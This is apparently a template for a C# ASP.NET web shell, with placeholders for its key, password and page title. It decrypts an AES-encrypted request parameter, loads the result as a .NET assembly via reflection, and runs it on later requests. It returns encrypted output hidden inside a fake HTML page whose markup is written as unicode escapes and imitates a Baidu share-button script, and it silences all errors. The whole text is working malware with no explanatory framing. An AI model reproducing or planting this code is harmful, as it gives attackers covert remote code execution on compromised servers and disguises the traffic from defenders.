try { string key = "{secretKey}"; string pass = "{pass}"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "").ToLower(); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); string left = md5.Substring(0, 5); string replacedString = "var Rebdsek_config=".Replace("bdsek", left); Context.Response.ContentType = "text/html"; Context.Response.Write("\u003C\u0021\u0044\u004F\u0043\u0054\u0059\u0050\u0045\u0020\u0068\u0074\u006D\u006C\u003E"); Context.Response.Write("\u003C\u0068\u0074\u006D\u006C\u0020\u006C\u0061\u006E\u0067\u003D\"\u0065\u006E\"\u003E"); Context.Response.Write("\u003C\u0068\u0065\u0061\u0064\u003E"); Context.Response.Write("\u003C\u006D\u0065\u0074\u0061\u0020\u0063\u0068\u0061\u0072\u0073\u0065\u0074\u003D\"\u0055\u0054\u0046\u002D\u0038\"\u003E"); Context.Response.Write("\u003C\u0074\u0069\u0074\u006C\u0065\u003E"); Context.Response.Write("{title}"); Context.Response.Write("\u003C\u002F\u0074\u0069\u0074\u006C\u0065\u003E"); Context.Response.Write("\u003C\u002F\u0068\u0065\u0061\u0064\u003E"); Context.Response.Write("\u003C\u0062\u006F\u0064\u0079\u003E"); Context.Response.Write("\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u003E"); Context.Response.Write("\u002F\u002F\u003C\u0021\u002D\u002D\u0020\u0042\u0061\u0069\u0064\u0075\u0020\u0042\u0075\u0074\u0074\u006F\u006E\u0020\u0042\u0045\u0047\u0049\u004E\u0020"); Context.Response.Write("\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0074\u0079\u0070\u0065\u003D\"\u0074\u0065\u0078\u0074\u002F\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\"\u0020\u0069\u0064\u003D\"\u0062\u0064\u0073\u0068\u0061\u0072\u0065\u005F\u006A\u0073\"\u0020\u0064\u0061\u0074\u0061\u003D\u0022\u0074\u0079\u0070\u0065\u003D\u0073\u006C\u0069\u0064\u0065\u0026\u0061\u006D\u0070\u003B\u0069\u0064\u003D\u0036\u0035\u0033\u0037\u0030\u0032\u0032"); Context.Response.Write("\u0022\u0020\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E"); Context.Response.Write("\u003C\u002F\u0062\u006F\u0064\u0079\u003E"); Context.Response.Write(replacedString); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(";"); Context.Response.Write("\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064\u0028\"\u0062\u0064\u0073\u0068\u0065\u006C\u006C\u005F\u006A\u0073\"\u0029\u002E\u0073\u0072\u0063\u0020\u003D\u0020\"\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0062\u0064\u0069\u006D\u0067\u002E\u0073\u0068\u0061\u0072\u0065\u002E\u0062\u0061\u0069\u0064\u0075\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u006A\u0073\u002F\u0073\u0068\u0065\u006C\u006C\u005F\u0076\u0032\u002E\u006A\u0073\u003F\u0063\u0064\u006E\u0076\u0065\u0072\u0073\u0069\u006F\u006E\u003D\"\u0020\u002B\u0020\u004D\u0061\u0074\u0068\u002E\u0063\u0065\u0069\u006C\u0028\u006E\u0065\u0077\u0020\u0044\u0061\u0074\u0065\u0028\u0029\u002F\u0036\u0033\u0036\u0030\u0030\u0030\u0030\u0029\u003B"); Context.Response.Write("\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E"); Context.Response.Write("\u002D\u002D\u003E"); Context.Response.Write("\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E"); Context.Response.Write("\u003C\u002F\u0062\u006F\u0064\u0079\u003E"); Context.Response.Write("\u003C\u002F\u0068\u0074\u006D\u006C\u003E"); } } catch (System.Exception) { }
